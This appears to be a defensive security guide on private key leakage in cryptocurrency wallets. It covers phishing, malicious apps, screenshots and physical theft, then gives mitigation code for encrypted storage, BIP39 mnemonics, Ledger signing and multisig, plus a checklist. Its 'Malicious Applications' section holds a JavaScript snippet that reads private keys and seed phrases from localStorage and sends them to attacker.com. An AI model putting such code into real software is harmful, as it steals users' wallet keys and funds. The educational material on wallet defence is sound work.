# Private Key Leakage Attack

## 📋 Attack Information
**Category**: Blockchain Wallet Attack | **Severity**: 🔴 Critical (CVSS 10.0)

## 🎯 Attack Principle
Attackers obtain users' private keys through various means, gaining complete control over wallet assets.

## 💀 Leakage Vectors

### 1. Phishing Websites
```
User visits fake wallet website:
- metamask-secure.com (fake)
- metamask.io (real)

Enters seed phrase on fake site
→ Seed phrase uploaded to attacker server
→ All assets stolen
```

### 2. Malicious Applications
```javascript
// Malicious app reads localStorage
const privateKey = localStorage.getItem('privateKey');
const seedPhrase = localStorage.getItem('mnemonic');

// Upload to attacker server
fetch('https://attacker.com/steal', {
  method: 'POST',
  body: JSON.stringify({ privateKey, seedPhrase }),
});
```

### 3. Screenshot/Screen Recording
```
User takes screenshot of seed phrase
→ Cloud sync (iCloud, Google Photos)
→ Cloud account compromised
→ Attacker finds screenshot
→ Assets stolen
```

### 4. Physical Theft
```
Seed phrase written on paper
→ Left in insecure location
→ Stolen or photographed
→ Assets stolen
```

## 💀 Real Cases

- **Mt. Gox (2014)**: Private key leakage → $450M loss
- **Bitfinex (2016)**: Private key compromise → $72M stolen
- **Various Phishing**: Thousands of victims annually

## 🛡️ Defense Measures

### 1. Never Store Plain Text Private Keys
```typescript
// ❌ DANGEROUS: Plain text storage
localStorage.setItem('privateKey', privateKey);

// ✅ SECURE: Hardware-encrypted storage
import { SecureStore } from './services/storage/SecureStore';

await SecureStore.setToken(
  'private_key',
  privateKey,
  3600,
  true // encrypt
);
```

### 2. Use BIP39 Mnemonic
```typescript
import * as bip39 from 'bip39';
import { hdkey } from 'ethereumjs-wallet';

// ✅ Generate secure mnemonic
const mnemonic = bip39.generateMnemonic(256); // 24 words

// Derive wallet
const seed = await bip39.mnemonicToSeed(mnemonic);
const hdwallet = hdkey.fromMasterSeed(seed);
const wallet = hdwallet.derivePath("m/44'/60'/0'/0/0").getWallet();

// NEVER store mnemonic in app
// Only show once to user for backup
```

### 3. User Education
```typescript
<SecurityWarning>
  <h3>🔐 Private Key Security Rules</h3>
  
  <h4>❌ NEVER:</h4>
  <ul>
    <li>Share your seed phrase with anyone</li>
    <li>Enter seed phrase on websites</li>
    <li>Take screenshots of seed phrase</li>
    <li>Store digitally (photos, notes apps)</li>
    <li>Send via email/messaging apps</li>
  </ul>
  
  <h4>✅ ALWAYS:</h4>
  <ul>
    <li>Write on paper, store securely</li>
    <li>Use hardware wallet for large amounts</li>
    <li>Verify website URLs carefully</li>
    <li>Use official wallet apps only</li>
  </ul>
  
  <Alert severity="error">
    ⚠️ Official support will NEVER ask for your seed phrase!
  </Alert>
</SecurityWarning>
```

### 4. Hardware Wallet Integration
```typescript
import Ledger from '@ledgerhq/hw-app-eth';

// ✅ Private key never leaves hardware device
async function signWithHardware(transaction: Transaction) {
  const transport = await TransportWebUSB.create();
  const ledger = new Ledger(transport);
  
  // Sign on device (user confirms on Ledger screen)
  const signature = await ledger.signTransaction(
    "44'/60'/0'/0/0",
    transaction.serialize()
  );
  
  return signature;
  // Private key NEVER exposed to computer
}
```

### 5. Multi-Signature Wallets
```solidity
// ✅ Gnosis Safe: Requires multiple signers
// Even if 1 key is compromised, assets are safe

contract MultiSigWallet {
    mapping(address => bool) public isOwner;
    uint public required; // e.g., 2 of 3
    
    function submitTransaction(address to, uint value) public {
        // Requires 2 signatures to execute
    }
}
```

## ✅ Security Checklist

```
Setup Phase:
□ Generate seed phrase offline
□ Write on paper (no screenshots)
□ Store in secure location (safe, bank vault)
□ Never enter seed phrase anywhere
□ Verify app/website authenticity

Development Phase:
□ Never store private keys in plain text
□ Use hardware-encrypted storage
□ Implement biometric authentication
□ Clear sensitive data from memory
□ No private keys in logs/errors

User Education:
□ Show security warnings during setup
□ Explain seed phrase importance
□ Provide phishing prevention tips
□ Encourage hardware wallet use
```

**Created**: November 11, 2025

